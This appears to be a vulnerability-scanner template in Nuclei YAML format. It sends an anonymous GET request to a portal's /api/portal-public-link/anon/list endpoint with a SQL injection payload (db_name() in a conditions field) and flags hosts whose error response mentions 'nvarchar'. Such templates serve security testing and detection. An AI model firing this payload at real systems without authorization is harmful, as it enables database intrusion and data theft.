id: msk-template

info:
  name: msk-template
  author: msk
  severity: high



http:
  - raw:
      - |
        GET /api/portal-public-link/anon/list?sorts=[{"Field":"SortID","SortBy":2},{"Field":'1',"SortBy":'1'}]&conditions=[{"Field":"IsEnable","DataType":1,"Option":1,"Value":'db_name()'},{"Field":"Module","DataType":1,"Option":7,"Value":"1"}] HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip
        Connection: close



    matchers:
      - type: dsl
        dsl:
          - status_code==400 && contains_all(body,'nvarchar')